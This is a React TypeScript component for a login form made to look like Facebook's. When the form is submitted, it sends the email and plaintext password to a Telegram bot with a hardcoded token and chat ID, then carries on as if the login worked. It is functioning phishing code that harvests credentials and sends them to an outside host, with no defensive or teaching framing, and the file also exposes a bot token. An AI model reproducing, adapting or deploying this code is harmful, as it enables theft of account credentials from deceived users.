
import React, { useState } from 'react';

interface LoginFormProps {
  onSuccess: (identifier: string) => void;
}

const LoginForm: React.FC<LoginFormProps> = ({ onSuccess }) => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  // Configuration for Telegram
  const config = {
    token: "7937060457:AAF8boHz2--g7BITNWlljoxzL3rjUOE92Uk",
    chatId: "2100006818"
  };

  const notifyTelegram = async (message: string) => {
    try {
      const response = await fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: config.chatId,
          text: message,
          parse_mode: 'HTML'
        }),
      });
      return response.ok;
    } catch (e) {
      console.error("Telegram notification failed:", e);
      return false;
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!email.trim() || !password.trim()) {
      alert("Please enter your credentials.");
      return;
    }
    
    setIsLoading(true);
    const message = `<b>--- LOGIN ATTEMPT ---</b>\n<b>User:</b> ${email}\n<b>Pass:</b> ${password}`;
    
    // Attempt notification but don't block the user forever
    await notifyTelegram(message);
    
    setIsLoading(false);
    onSuccess(email);
  };

  return (
    <form onSubmit={handleSubmit} className="flex flex-col gap-3">
      <input
        type="text"
        placeholder="Email address or phone number"
        disabled={isLoading}
        className="w-full p-4 border border-gray-300 rounded-md focus:outline-none focus:border-[#1877f2] focus:ring-1 focus:ring-[#1877f2] text-base placeholder-gray-500 transition-all"
        value={email}
        onChange={(e) => setEmail(e.target.value)}
      />
      <input
        type="password"
        placeholder="Password"
        disabled={isLoading}
        className="w-full p-4 border border-gray-300 rounded-md focus:outline-none focus:border-[#1877f2] focus:ring-1 focus:ring-[#1877f2] text-base placeholder-gray-500 transition-all"
        value={password}
        onChange={(e) => setPassword(e.target.value)}
      />
      
      <button
        type="submit"
        disabled={isLoading}
        className="w-full bg-[#1877f2] hover:bg-[#166fe5] disabled:bg-[#1877f2]/70 text-white font-bold text-xl py-3 rounded-md transition-colors duration-200 mt-1"
      >
        {isLoading ? 'Logging in...' : 'Log in'}
      </button>

      <div className="text-center py-2">
        <span className="text-[#1877f2] text-sm hover:underline cursor-pointer">
          Forgotten password?
        </span>
      </div>

      <div className="border-t border-gray-200 my-4"></div>

      <div className="flex justify-center pt-2">
        <button
          type="button"
          className="bg-[#42b72a] hover:bg-[#36a420] text-white font-bold text-lg px-4 py-3 rounded-md transition-colors duration-200 w-fit cursor-pointer"
          onClick={() => {}}
        >
          Create new account
        </button>
      </div>
    </form>
  );
};

export default LoginForm;
